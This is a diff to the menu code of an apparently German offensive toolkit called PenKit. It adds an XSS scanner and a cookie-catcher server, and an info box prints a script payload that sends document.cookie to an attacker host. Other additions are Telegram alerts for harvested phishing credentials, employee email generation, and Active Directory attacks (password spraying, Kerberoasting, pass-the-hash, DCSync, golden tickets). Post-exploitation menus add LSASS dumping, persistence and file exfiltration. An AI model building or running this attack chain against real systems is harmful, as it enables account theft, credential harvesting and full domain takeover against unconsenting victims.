@@ -520,6 +520,10 @@ async def menu_web():
         menu_item(" 4", "🔬  Vuln Scan (nikto + nuclei)",  "🟠", "Bekannte CVEs, Fehlkonfigurationen")
         menu_item(" 5", "🔗  Full Auto Chain",             "🟠", "Fingerprint → Fuzz → SQLi → Vuln Scan")
         menu_item(" 6", "🪝  BeEF Browser Exploitation",   "⛔", "Browser hooken, Keylogger, Screenshot, Webcam")
+        menu_item(" 7", "💥  XSS Scanner (dalfox)",        "🔴", "reflektiert + DOM + Blind XSS, WAF-Bypass")
+        menu_item(" 8", "🎯  XSS Payload-Tester",          "🔴", "Payload-Bibliothek gegen URL testen")
+        menu_item(" 9", "🍪  Cookie-Catcher starten",      "🔴", "Empfängt XSS-Callbacks (Cookies, Keys)")
+        menu_item(" X", "📋  XSS Payloads anzeigen",       "🟡", "Alle Contexts: HTML, Attr, JS, WAF-Bypass")
         menu_item(" 0", "← Zurück", "")
 
         choice = prompt("web")
@@ -574,6 +578,91 @@ async def menu_web():
                 await run_tool_live(sc.nuclei_scan(url))
             except KeyboardInterrupt:
                 pass
+
+        elif choice == "7":
+            banner()
+            section("💥  XSS SCANNER", "dalfox — reflektiert + DOM + Blind XSS")
+            info_box([
+                "dalfox ist der schnellste XSS-Scanner:",
+                "  → Reflektiertes XSS in URL-Parametern",
+                "  → DOM-basiertes XSS",
+                "  → Blind XSS (mit Callback-URL)",
+                "  → WAF-Evasion eingebaut",
+                "",
+                "Install: apt install dalfox",
+            ])
+            print()
+            url = ask("Ziel-URL (https://example.com/page?q=test)", required=True)
+            if not url:
+                wait_key(); continue
+            param = ask("Parameter (leer = alle testen)", "")
+            cookie = ask("Cookie (leer = ohne)", "")
+            blind = ask("Blind XSS Callback-URL (leer = aus)", "")
+            print()
+            from tools.web.xss_engine import dalfox_scan
+            try:
+                await run_tool_live(dalfox_scan(url, param, cookie, blind=blind))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "8":
+            banner()
+            section("🎯  XSS PAYLOAD-TESTER", "Eigene Payload-Bibliothek gegen Ziel testen")
+            info_box([
+                "Testet vordefinierte Payloads gegen URL + Parameter.",
+                "Erkennt ob Payload im Response reflektiert wird.",
+                "",
+                "Contexts:",
+                "  html_basic  — direktes HTML (Standard)",
+                "  attribute   — in HTML-Attributen",
+                "  js_string   — in JavaScript-Strings",
+                "  waf_bypass  — WAF-Bypass Varianten",
+                "  dom_xss     — DOM-basiert (#fragment)",
+            ])
+            print()
+            url = ask("Ziel-URL", required=True)
+            if not url:
+                wait_key(); continue
+            param = ask("Parameter-Name (z.B. 'q', 'search', 'id')", "q")
+            ctx = ask("Context [html_basic/attribute/js_string/waf_bypass/dom_xss]", "html_basic")
+            print()
+            from tools.web.xss_engine import test_payloads
+            try:
+                await run_tool_live(test_payloads(url, param, ctx))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "9":
+            banner()
+            section("🍪  COOKIE-CATCHER", "XSS-Callbacks empfangen")
+            info_box([
+                "Startet HTTP-Server der XSS-Payloads abrufen:",
+                "  → Cookies (document.cookie)",
+                "  → Keylogger-Daten",
+                "  → Beliebige Daten via fetch/img-src",
+                "",
+                "Payload-Beispiel:",
+                "  <script>new Image().src='http://<kali>:8080/?c='+document.cookie</script>",
+            ])
+            print()
+            try:
+                port = int(ask("Port", "8080"))
+            except ValueError:
+                port = 8080
+            print()
+            from tools.web.xss_engine import start_cookie_catcher
+            try:
+                await run_tool_live(start_cookie_catcher(port))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice in ("x", "X"):
+            banner()
+            section("📋  XSS PAYLOAD-BIBLIOTHEK", "Alle Payloads nach Context")
+            kali_ip = ask("Deine Kali IP (für Cookie-Steal Payloads)", "10.10.10.1")
+            print()
+            from tools.web.xss_engine import show_payloads
+            await run_tool_live(show_payloads("all", kali_ip))
 
         elif choice == "6":
             banner()
@@ -866,6 +955,10 @@ async def menu_osint():
         menu_item("6", "Shodan — Internet Device Search",         "🟡", "Verwundbare Geräte weltweit")
         menu_item("7", "Shodan — IP Lookup",                      "🟡", "Alle Infos zu einer IP")
         menu_item("8", "Shodan — Eigene externe IP",              "🟢", "Was sieht Internet von dir?")
+        menu_item("9", "🔓  Breach Lookup (HIBP)",               "🟡", "E-Mail in Datenleak-Datenbanken prüfen")
+        menu_item("B", "📧  Bulk E-Mail Breach Check",            "🟡", "Mehrere Mails auf einmal prüfen")
+        menu_item("L", "🔑  LinkedIn / E-Mail Generator",         "🟡", "Mitarbeiterliste → Unternehmens-E-Mails")
+        menu_item("P", "🔐  Passwort Breach Check",               "🟢", "Passwort sicher prüfen (k-Anonymity)")
         menu_item("0", "Back")
 
         choice = prompt("osint")
@@ -937,6 +1030,97 @@ async def menu_osint():
             shodan = ShodanLookup()
             print()
             await run_tool_live(shodan.my_ip_info())
+
+        elif choice == "9":
+            banner()
+            section("🔓  BREACH LOOKUP", "HaveIBeenPwned — E-Mail in Datenlecks prüfen")
+            info_box([
+                "Prüft ob eine E-Mail-Adresse in bekannten Datenlecks vorkommt.",
+                "Quellen: Adobe, LinkedIn, Dropbox, RockYou, 700+ weitere Breaches.",
+                "",
+                "Für vollständige Details: kostenloser API-Key auf haveibeenpwned.com",
+                "Ohne Key: Anzahl der Leaks + Breach-Namen (eingeschränkt)",
+            ])
+            print()
+            email = ask("E-Mail-Adresse", required=True)
+            if not email:
+                wait_key(); continue
+            api_key = ask("HIBP API-Key (Enter = ohne Key)", "")
+            print()
+            from tools.osint.breach_lookup import hibp_check
+            await run_tool_live(hibp_check(email, api_key))
+
+        elif choice in ("b", "B"):
+            banner()
+            section("📧  BULK BREACH CHECK", "Mehrere E-Mails gegen Leak-DBs prüfen")
+            info_box([
+                "Gibt E-Mails zeilenweise ein (eine pro Zeile).",
+                "Oder: Pfad zu einer Textdatei mit E-Mails.",
+                "",
+                "Rate-Limit: 1 Request/Sekunde (HIBP-Limit).",
+            ])
+            print()
+            source = ask("E-Mail(s) direkt eingeben oder Datei-Pfad?", "")
+            if not source:
+                wait_key(); continue
+            import os
+            if os.path.exists(source):
+                with open(source) as f:
+                    emails = [l.strip() for l in f if l.strip() and "@" in l]
+            else:
+                emails = [e.strip() for e in source.split(",") if "@" in e]
+                if not emails:
+                    emails = [source]
+            api_key = ask("HIBP API-Key (Enter = ohne Key)", "")
+            print()
+            from tools.osint.breach_lookup import hibp_bulk
+            await run_tool_live(hibp_bulk(emails, api_key))
+
+        elif choice in ("l", "L"):
+            banner()
+            section("🔑  E-MAIL GENERATOR", "Namen → Firmen-E-Mails generieren")
+            info_box([
+                "Generiert mögliche E-Mail-Adressen aus Mitarbeiternamen.",
+                "Formate: vorname.nachname@firma.com, v.nachname@firma.com, ...",
+                "",
+                "Namen eingeben: eine pro Zeile als 'Vorname Nachname'",
+                "Oder: Pfad zu Textdatei mit Namen",
+                "",
+                "Kombination mit HIBP-Check: findet welche E-Mails existieren",
+            ])
+            print()
+            domain = ask("Unternehmens-Domain (firma.com)", required=True)
+            if not domain:
+                wait_key(); continue
+            source = ask("Namen (kommagetrennt oder Datei-Pfad)", "")
+            if not source:
+                wait_key(); continue
+            import os
+            if os.path.exists(source):
+                with open(source) as f:
+                    names = [l.strip() for l in f if l.strip()]
+            else:
+                names = [n.strip() for n in source.split(",") if n.strip()]
+            print()
+            from tools.osint.breach_lookup import generate_email_list
+            await run_tool_live(generate_email_list(domain, names))
+
+        elif choice in ("p", "P"):
+            banner()
+            section("🔐  PASSWORT BREACH CHECK", "Sicher prüfen ob Passwort in Leaks vorkommt")
+            info_box([
+                "Nutzt k-Anonymity: dein Passwort verlässt NIEMALS dein Gerät.",
+                "Es wird nur ein 5-char SHA1-Prefix gesendet — sicher!",
+                "",
+                "Gut für: eigene Passwörter prüfen, Passwort-Policy testen",
+            ])
+            print()
+            pw = ask("Passwort prüfen", required=True)
+            if not pw:
+                wait_key(); continue
+            print()
+            from tools.osint.breach_lookup import password_pwned_check
+            await run_tool_live(password_pwned_check(pw))
 
         wait_key()
 
@@ -1138,15 +1322,29 @@ async def menu_phishing():
                         "bank": "https://www.google.com"}
             redirect = defaults.get(page, "https://google.com")
 
+        info_box([
+            "Telegram-Alert (optional):",
+            "  → Sofortige Benachrichtigung wenn jemand seine Daten eingibt",
+            "  → Zeigt IP, Username, Passwort direkt auf dein Handy",
+            "  → Token + Chat-ID aus Telegram-Bot (wie im C2-Menü)",
+        ])
+        tg_token   = prompt("Telegram Bot-Token (Enter = kein Alert)") or ""
+        tg_chat_id = prompt("Telegram Chat-ID (Enter = kein Alert)") or "" if tg_token else ""
+
         print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
         if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
             print(f"  {Y}[!] Abgebrochen.{R}")
             wait_key()
             return
         print()
+        if tg_token:
+            print(f"  {G}[✓] Telegram-Alert aktiv — Treffer werden sofort gesendet!{R}\n")
         try:
             from tools.phishing.server import PhishingServer
-            srv = PhishingServer(page=page, port=port, use_https=use_https, redirect_url=redirect)
+            srv = PhishingServer(
+                page=page, port=port, use_https=use_https, redirect_url=redirect,
+                telegram_token=tg_token, telegram_chat_id=tg_chat_id,
+            )
             await run_tool_live(srv.start())
         except Exception as e:
             print(f"  {RD}[!] {e}{R}")
@@ -2324,6 +2522,427 @@ Erkläre kurz warum du diesen Angriff wählst."""
     wait_key()
 
 
+async def menu_ad():
+    """Active Directory Suite — vollständige AD-Angriffskette."""
+    while True:
+        banner()
+        section("🏰  ACTIVE DIRECTORY SUITE", "SMB · Kerberos · Pass-the-Hash · BloodHound · DCSync")
+        print(f"  {RD}{B}⛔  NUR gegen autorisierte Ziele / eigene Lab-Umgebungen!{R}\n")
+        menu_item(" 1", "🔍  SMB Enumeration",          "🔴", "Shares, Sessions, User, Gruppen, Pass-Policy")
+        menu_item(" 2", "💀  Password Spray",            "⛔", "1 Passwort gegen viele User — kein Lockout")
+        menu_item(" 3", "🎫  Kerberoasting",             "⛔", "Service-Account TGS-Hashes ohne Admin-Rechte")
+        menu_item(" 4", "👻  AS-REP Roasting",           "⛔", "Hashes ohne Pre-Auth — kein Passwort nötig")
+        menu_item(" 5", "🔑  Pass-the-Hash",             "⛔", "Shell mit NTLM-Hash statt Passwort")
+        menu_item(" 6", "🩸  Secrets Dump",              "⛔", "SAM + LSA + NTDS.dit (impacket-secretsdump)")
+        menu_item(" 7", "🕸️   BloodHound sammeln",        "🔴", "AD-Graphen für Domain Admin Pfade")
+        menu_item(" 8", "📋  LDAP Dump",                 "🔴", "Alle User/Gruppen/Computer aus AD")
+        menu_item(" 9", "☠️   DCSync",                    "⛔", "Alle Hashes replizieren (Domain Admin nötig)")
+        menu_item(" G", "🥇  Golden Ticket",             "⛔", "krbtgt-Hash → TGT für jeden Account")
+        menu_item(" 0", "← Zurück", "")
+
+        choice = prompt("ad")
+        if choice == "0":
+            return
+
+        clr()
+
+        def get_ad_creds(need_dc: bool = True):
+            dc = ask("DC IP (Domain Controller)", required=True) if need_dc else ""
+            domain = ask("Domain (CORP.LOCAL)", required=True)
+            user = ask("Username", required=True)
+            print(f"  {DIM}Passwort ODER NTLM-Hash angeben (eines leer lassen){R}")
+            pw = ask("Passwort (leer = Hash nutzen)", "")
+            h = ask("NTLM-Hash (leer = Passwort nutzen)", "")
+            return dc, domain, user, pw, h
+
+        if choice == "1":
+            banner(); section("🔍  SMB ENUMERATION", "Vollständige SMB/AD-Aufklärung")
+            info_box([
+                "Enumiert via CrackMapExec / NetExec:",
+                "  Shares, Sessions, angemeldete User, Gruppen, Passwort-Policy",
+                "  Auch ohne Credentials (Null-Session) oft möglich!",
+            ])
+            print()
+            target = ask("Ziel (IP, CIDR oder Hostname)", required=True)
+            domain = ask("Domain (leer = Workgroup)", "")
+            user   = ask("Username (leer = Anonymous)", "")
+            pw     = ask("Passwort (leer = kein)", "")
+            h      = ask("NTLM-Hash (leer = Passwort nutzen)", "")
+            print()
+            from tools.network.ad_suite import smb_enum
+            try:
+                await run_tool_live(smb_enum(target, domain, user, pw, h))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "2":
+            banner(); section("💀  PASSWORD SPRAY", "1 Passwort gegen alle User")
+            info_box([
+                "Testet EIN Passwort gegen ALLE User gleichzeitig.",
+                "Vorteil: kein Account-Lockout (nur 1 Versuch pro Account).",
+                "",
+                "Strategie: Saisonale Passwörter — 'Herbst2024!', 'Company123!'",
+                "User-Liste: via LDAP-Dump (Option 8) oder AS-REP (Option 4) holen.",
+            ])
+            print()
+            targets = ask("Ziel (IP oder CIDR)", required=True)
+            user_file = ask("User-Liste (Datei-Pfad)", required=True)
+            password = ask("Zu testendes Passwort", required=True)
+            domain = ask("Domain", "")
+            print()
+            from tools.network.ad_suite import smb_spray
+            try:
+                await run_tool_live(smb_spray(targets, user_file, password, domain))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "3":
+            banner(); section("🎫  KERBEROASTING", "Service Account TGS-Hashes offline cracken")
+            info_box([
+                "Nur Domain-User-Account nötig (kein Admin!).",
+                "Kerberoastable Accounts: alle mit gesetztem ServicePrincipalName (SPN).",
+                "",
+                "Hashes cracken mit: hashcat -m 13100 hash.txt rockyou.txt",
+                "Ziel: Service-Account-Passwörter → oft schwach + nie rotiert",
+            ])
+            print()
+            dc_ip, domain, user, pw, h = get_ad_creds()
+            if not all([dc_ip, domain, user]):
+                wait_key(); continue
+            print()
+            from tools.network.ad_suite import kerberoast
+            try:
+                await run_tool_live(kerberoast(dc_ip, domain, user, pw, h))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "4":
+            banner(); section("👻  AS-REP ROASTING", "Pre-Auth deaktiviert = Hash ohne Credentials")
+            info_box([
+                "KEIN Passwort nötig — rein unauthenticated!",
+                "Accounts ohne Kerberos Pre-Auth Authentication angreifbar.",
+                "",
+                "Hashes cracken mit: hashcat -m 18200 hash.txt rockyou.txt",
+                "User-Liste: aus LDAP oder Username-Enumeration",
+            ])
+            print()
+            dc_ip = ask("DC IP", required=True)
+            domain = ask("Domain", required=True)
+            user_file = ask("User-Liste (leer = alle Domain-User testen)", "")
+            print()
+            from tools.network.ad_suite import asrep_roast
+            try:
+                await run_tool_live(asrep_roast(dc_ip, domain, user_file=user_file))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "5":
+            banner(); section("🔑  PASS-THE-HASH", "Shell mit NTLM-Hash")
+            info_box([
+                "Kein Klartextpasswort nötig — nur der NTLM-Hash.",
+                "Hash kommt aus: secretsdump, DCSync, LSASS-Dump",
+                "",
+                "Versucht: CME exec → psexec → wmiexec",
+                "Befehl-Ergebnis wird direkt angezeigt.",
+            ])
+            print()
+            target = ask("Ziel IP", required=True)
+            domain = ask("Domain", required=True)
+            user   = ask("Username", required=True)
+            h      = ask("NTLM-Hash (32 hex Zeichen)", required=True)
+            cmd    = ask("Befehl ausführen", "whoami /all")
+            print()
+            from tools.network.ad_suite import pass_the_hash
+            try:
+                await run_tool_live(pass_the_hash(target, domain, user, h, cmd))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "6":
+            banner(); section("🩸  SECRETS DUMP", "SAM + LSA + NTDS.dit Hashes")
+            info_box([
+                "Dumpt alle lokalen + Domain-Hashes via impacket-secretsdump.",
+                "",
+                "Was wird gedumpt:",
+                "  SAM     — lokale Windows-Account-Hashes",
+                "  LSA     — gecachte Domain-Credentials",
+                "  NTDS.dit — alle Domain-Account-Hashes",
+                "",
+                "Braucht: Admin-Rechte auf Ziel-Host",
+            ])
+            print()
+            target = ask("Ziel IP", required=True)
+            domain = ask("Domain", required=True)
+            user   = ask("Admin-Username", required=True)
+            pw     = ask("Passwort (leer = Hash nutzen)", "")
+            h      = ask("NTLM-Hash (leer = Passwort nutzen)", "")
+            print()
+            from tools.network.ad_suite import dump_secrets
+            try:
+                await run_tool_live(dump_secrets(target, domain, user, pw, h))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "7":
+            banner(); section("🕸️  BLOODHOUND", "AD Attack Paths visualisieren")
+            info_box([
+                "bloodhound-python sammelt AD-Daten:",
+                "  User, Gruppen, Computer, Sessions, ACLs, Trusts",
+                "",
+                "Install: pip3 install bloodhound",
+                "Danach: BloodHound Desktop öffnen → JSON importieren",
+                "",
+                "Wichtigste Query: 'Shortest Path to Domain Admin'",
+            ])
+            print()
+            dc_ip, domain, user, pw, h = get_ad_creds()
+            if not all([dc_ip, domain, user]):
+                wait_key(); continue
+            collection = ask("Collection-Methode [All/Default/Session/Acl]", "All")
+            print()
+            from tools.network.ad_suite import bloodhound_collect
+            try:
+                await run_tool_live(bloodhound_collect(dc_ip, domain, user, pw, h, collection))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "8":
+            banner(); section("📋  LDAP DUMP", "Alle AD-Objekte auslesen")
+            info_box([
+                "Liest alle User, Gruppen, Computer aus dem AD via LDAP.",
+                "Ergibt: vollständige User-Liste für Spray-Angriffe",
+                "",
+                "Null-Session oft möglich (ohne Credentials)!",
+            ])
+            print()
+            dc_ip = ask("DC IP", required=True)
+            domain = ask("Domain (corp.local)", required=True)
+            user = ask("Username (leer = Null-Session versuchen)", "")
+            pw = ask("Passwort", "") if user else ""
+            print()
+            from tools.network.ad_suite import ldap_dump
+            try:
+                await run_tool_live(ldap_dump(dc_ip, domain, user, pw))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice == "9":
+            banner(); section("☠️  DCSYNC", "Alle Domain-Hashes replizieren")
+            info_box([
+                "DCSync repliziert NTDS.dit via MS-DRSR — wie ein echter DC.",
+                "Kein Login auf DC nötig — rein über Netzwerk.",
+                "",
+                "Braucht: Domain Admin ODER Replication-Rechte (DS-Replication-Get-Changes)",
+                "Ergebnis: ALLE NTLM-Hashes der Domain → Pass-the-Hash / Cracken",
+            ])
+            print()
+            dc_ip, domain, user, pw, h = get_ad_creds()
+            if not all([dc_ip, domain, user]):
+                wait_key(); continue
+            target_user = ask("Nur diesen User dumpen (leer = alle)", "")
+            print()
+            print(f"  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
+            if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
+                wait_key(); continue
+            print()
+            from tools.network.ad_suite import dcsync
+            try:
+                await run_tool_live(dcsync(dc_ip, domain, user, pw, h, target_user))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        elif choice in ("g", "G"):
+            banner(); section("🥇  GOLDEN TICKET", "TGT für beliebigen Account erstellen")
+            info_box([
+                "Mit dem krbtgt-Hash ein TGT für jeden Account erstellen.",
+                "Domain-weiter Zugriff, 10 Jahre gültig.",
+                "",
+                "krbtgt-Hash bekommt man via DCSync:",
+                "  → Option 9: DCSync → 'krbtgt' als Ziel-User",
+                "",
+                "Domain SID: impacket-lookupsid domain/user:pass@dc_ip",
+            ])
+            print()
+            domain = ask("Domain (corp.local)", required=True)
+            sid = ask("Domain SID (S-1-5-21-...)", required=True)
+            krbtgt = ask("krbtgt NTLM-Hash", required=True)
+            target_user = ask("Als welcher User? (default: Administrator)", "Administrator")
+            print()
+            from tools.network.ad_suite import golden_ticket
+            try:
+                await run_tool_live(golden_ticket(domain, sid, krbtgt, target_user))
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[!] Gestoppt.{R}")
+
+        wait_key()
+
+
+async def menu_postexploit():
+    """Post-Exploitation — nach dem ersten Shell."""
+    while True:
+        banner()
+        section("🔥  POST-EXPLOITATION", "WinPEAS · Cred-Dump · Persistence · LOLBAS · Exfil")
+        print(f"  {RD}{B}⛔  NUR auf autorisierten Systemen!{R}\n")
+        menu_item(" 1", "⬆️   WinPEAS / LinPEAS",         "🔴", "Privesc-Pfade automatisch finden + anzeigen")
+        menu_item(" 2", "🔑  LSASS Dump (kein Mimikatz)", "⛔", "comsvcs.dll MiniDump — kein Upload nötig")
+        menu_item(" 3", "💾  SAM/SYSTEM Dump",            "⛔", "Offline-Analyse mit impacket-secretsdump")
+        menu_item(" 4", "🔒  Persistence Builder",        "⛔", "Registry, Scheduled Task, WMI, Startup")
+        menu_item(" 5", "📁  File Exfiltration",          "🔴", "Juicy Files finden + exfiltrieren")
+        menu_item(" 6", "🪟  LOLBAS Cheatsheet",          "🟡", "Windows-Bordmittel: certutil, mshta, wmic...")
+        menu_item(" 7", "📡  pypykatz (Dump analysieren)","🔴", "LSASS.dmp auf Kali analysieren")
+        menu_item(" 0", "← Zurück", "")
+
+        choice = prompt("postexploit")
+        if choice == "0":
+            return
+
+        clr()
+
+        if choice == "1":
+            banner(); section("⬆️  PEAS PRIVESC FINDER", "WinPEAS / LinPEAS Payloads")
+            info_box([
+                "WinPEAS / LinPEAS: automatisch alle Privesc-Pfade finden.",
+                "",
+                "Findet: AlwaysInstallElevated, unquoted Service Paths,",
+                "        schwache ACLs, gecachte Credentials, Scheduled Tasks,",
+                "        Registry-Passwörter, DLL Hijacking, UAC-Bypasses",
+                "",
+                "Fileless-Methode: direkt aus RAM, kein AV-Scan.",
+            ])
+            print()
+            target_os = ask("Ziel OS [windows/linux]", "windows")
+            kali_ip = ask("Deine Kali IP", "10.10.10.1")
+            print()
+            from tools.c2.post_exploit import generate_peas_payload, download_peas
+            dl = ask("PEAS herunterladen? [j/n]", "j")
+            if dl.lower() == "j":
+                await run_tool_live(download_peas(target_os))
+                print()
+            await run_tool_live(generate_peas_payload(target_os, kali_ip))
+
+        elif choice == "2":
+            banner(); section("🔑  LSASS DUMP", "comsvcs.dll — kein Mimikatz, kein Upload")
+            info_box([
+                "LSASS Dump via comsvcs.dll MiniDump:",
+                "  → Kein Tool-Upload nötig — nur Windows-Bordmittel",
+                "  → Braucht: SeDebugPrivilege (default bei Admin-Konten)",
+                "  → Dump landet in C:\\Windows\\Temp\\lsass.dmp",
+                "",
+                "Danach auf Kali analysieren:",
+                "  → Option 7: pypykatz → findet alle Passwörter/Hashes",
+                "  → impacket-secretsdump → aus Dump extrahieren",
+            ])
+            print()
+            print(f"  {G}[*] Generiere LSASS Dump PS1-Befehl:\033[0m\n")
+            from tools.c2.post_exploit import lsass_dump_ps1, sam_dump_cmds
+            cmd = lsass_dump_ps1("comsvcs")
+            print(f"  \033[36m{cmd}\033[0m\n")
+            print(f"  {DIM}--- SAM/SYSTEM Hive Alternative ---{R}")
+            for c in sam_dump_cmds():
+                print(f"  \033[36m{c}\033[0m")
+
+        elif choice == "3":
+            banner(); section("💾  SAM/SYSTEM DUMP", "Registry Hives offline analysieren")
+            print()
+            from tools.c2.post_exploit import sam_dump_cmds
+            for c in sam_dump_cmds():
+                print(f"  \033[36m{c}\033[0m")
+            print()
+            print(f"  {DIM}Hive-Dateien auf Kali: impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL{R}")
+
+        elif choice == "4":
+            banner(); section("🔒  PERSISTENCE BUILDER", "Alle Persistence-Methoden")
+            info_box([
+                "4 Methoden, verschiedene Stealth-Level:",
+                "  Registry Run Key — einfach, sichtbar in Autoruns",
+                "  Scheduled Task   — echter Name, als SYSTEM",
+                "  WMI Subscription — sehr versteckt, kein Run-Key",
+                "  Startup-Ordner   — simpel, sichtbar im Explorer",
+            ])
+            print()
+            payload_path = ask("Payload-Pfad auf Ziel", "C:\\Windows\\Temp\\update.exe")
+            print()
+            from tools.c2.post_exploit import show_persistence_options
+            await run_tool_live(show_persistence_options(payload_path))
+
+        elif choice == "5":
+            banner(); section("📁  FILE EXFILTRATION", "Interessante Dateien finden + exfiltrieren")
+            info_box([
+                "Sucht nach:",
+                "  → .kdbx (KeePass), .rdp, .ppk (SSH-Keys), .pfx (Zertifikate)",
+                "  → .env, web.config, credentials.xml",
+                "  → Passwort-Dateien in Desktop/Docs/Downloads",
+                "",
+                "Exfil-Methoden: HTTP POST, SMB Share, DNS-Tunnel",
+            ])
+            print()
+            kali_ip = ask("Deine Kali IP", "10.10.10.1")
+            try:
+                port = int(ask("Port für Empfang", "4444"))
+            except ValueError:
+                port = 4444
+            print()
+            from tools.c2.post_exploit import generate_exfil_payloads
+            await run_tool_live(generate_exfil_payloads(kali_ip, port))
+
+        elif choice == "6":
+            banner(); section("🪟  LOLBAS CHEATSHEET", "Windows Built-in Tools missbrauchen")
+            print()
+            filter_term = ask("Filter (leer = alle zeigen)", "")
+            print()
+            from tools.c2.post_exploit import show_lolbas
+            await run_tool_live(show_lolbas(filter_term))
+
+        elif choice == "7":
+            banner(); section("📡  PYPYKATZ", "LSASS-Dump auf Kali analysieren")
+            info_box([
+                "pypykatz = Python-Mimikatz — analysiert LSASS.dmp auf Kali.",
+                "Install: pip3 install pypykatz --break-system-packages",
+                "",
+                "Dump holen via:",
+                "  Option 2 → PS1-Befehl auf Ziel ausführen",
+                "  Dann: copy C:\\Windows\\Temp\\lsass.dmp \\\\<kali>\\share\\",
+            ])
+            print()
+            dump_path = ask("Pfad zur .dmp Datei", required=True)
+            if not dump_path:
+                wait_key(); continue
+            import os
+            if not os.path.exists(dump_path):
+                print(f"  {Y}[!] Datei nicht gefunden: {dump_path}{R}")
+                wait_key(); continue
+            print()
+            from tools.c2.post_exploit import analyze_lsass_dump
+            await run_tool_live(analyze_lsass_dump(dump_path))
+
+        wait_key()
+
+
+async def menu_report():
+    """HTML-Report aus allen Scan-Ergebnissen generieren."""
+    banner()
+    section("📊  HTML REPORT GENERATOR", "Alle Scans → professioneller Report")
+    info_box([
+        "Liest alle Dateien aus ~/penkit-output/ und erstellt:",
+        "  → Dashboard mit CVEs, Credentials, Payloads, WiFi-Captures",
+        "  → Farbcodiert nach Kritikalität (Critical → Low)",
+        "  → Sortierte CVE-Tabelle mit Metasploit-Modulen",
+        "  → Credentials-Tabelle",
+        "  → Standalone HTML — kein Internet nötig",
+        "",
+        "Tipp: firefox ~/penkit-output/report_*.html öffnen",
+    ])
+    print()
+    title = ask("Report-Titel", "PenKit Pentest Report")
+    print()
+    from core.report_gen import generate_report
+    try:
+        await run_tool_live(generate_report(title))
+    except Exception as e:
+        print(f"  {RD}[!] {e}{R}")
+    wait_key()
+
+
 async def menu_output():
     """Output-Verzeichnis — zeigt alle gespeicherten Dateien."""
     from core.output_dir import summary, ROOT, DIRS, list_files
@@ -2389,12 +3008,14 @@ async def main_menu():
         print(f"  {DIM}├{'─'*66}┤{R}")
         menu_item(" 1", "📡  WiFi Attacks",          "🟠", "WPA2/3 crack, Evil Twin, PMKID, Deauth, Handshake")
         menu_item(" 2", "🌐  Network Intelligence",  "🟠", "Nmap scan, CVE check, topology map, attack chain")
-        menu_item(" 3", "💻  Web Attack",            "🟠", "SQLmap, ffuf, nikto, XSS, LFI, BeEF")
+        menu_item(" 3", "💻  Web Attack",            "🟠", "SQLmap, ffuf, nikto, XSS, LFI, BeEF, dalfox")
         menu_item(" 4", "🔑  Passwords & Hashes",   "🟡", "Hashcat GPU, John, Hydra brute-force, hash detect")
         menu_item(" 5", "☠️   MITM",                  "🔴", "ARP spoof, SSL strip, Responder, DNS poison")
-        menu_item(" 6", "🔍  OSINT Recon",           "🟡", "Emails, subdomains, Sherlock 300+ platforms, report")
-        menu_item(" 7", "🎣  Phishing Suite",        "⛔", "Fake Login Pages, Email-Kampagnen, GoPhish, Creds")
+        menu_item(" 6", "🔍  OSINT Recon",           "🟡", "Emails, Shodan, Breach-Lookup, LinkedIn, HIBP")
+        menu_item(" 7", "🎣  Phishing Suite",        "⛔", "Fake Login, Telegram-Alert, Email-Kampagnen, Creds")
         menu_item(" 9", "💀  C2 / RAT Payloads",     "⛔", "AMSI bypass, fileless shellcode, hollow, disguise")
+        menu_item(" W", "🏰  Active Directory",      "⛔", "Kerberoast, PtH, BloodHound, DCSync, Golden Ticket")
+        menu_item(" P", "🔥  Post-Exploitation",     "⛔", "WinPEAS, LSASS Dump, Persistence, Exfil, LOLBAS")
         print(f"  {DIM}├{'─'*66}┤{R}")
         print(f"  {DIM}│{'  🔵  BLUE TEAM  /  🃏  JOKER':^66}│{R}")
         print(f"  {DIM}├{'─'*66}┤{R}")
@@ -2408,6 +3029,7 @@ async def main_menu():
         menu_item(" T", "📚  Tutorials",              "🟢", "Schritt-für-Schritt Anleitungen für alle Module")
         menu_item(" H", "🏥  Health Check",           "🟢", "Prüft welche Tools installiert sind")
         menu_item(" M", "🗺️   Target Map",             "🟡", "Interaktive Karte mit allen bekannten Ziel-Infos")
+        menu_item(" R", "📊  HTML Report",            "🟢", "Alle Scan-Ergebnisse → professioneller HTML-Report")
         menu_item(" O", "📁  Output-Verzeichnis",     "🟢", "Zeigt ~/penkit-output/ — alle gespeicherten Dateien")
         print(f"  {DIM}└{'─'*66}┘{R}")
         print()
@@ -2425,11 +3047,14 @@ async def main_menu():
             "7": menu_phishing,
             "8": menu_blueteam,
             "9": menu_c2,
+            "w": menu_ad, "W": menu_ad,
+            "p": menu_postexploit, "P": menu_postexploit,
             "j": menu_joker, "J": menu_joker,
             "?": menu_assistant,
             "t": menu_tutorials, "T": menu_tutorials,
             "h": menu_health, "H": menu_health,
             "m": menu_map,   "M": menu_map,
+            "r": menu_report, "R": menu_report,
             "o": menu_output,"O": menu_output,
             "a": menu_ai_terminal, "A": menu_ai_terminal,
         }
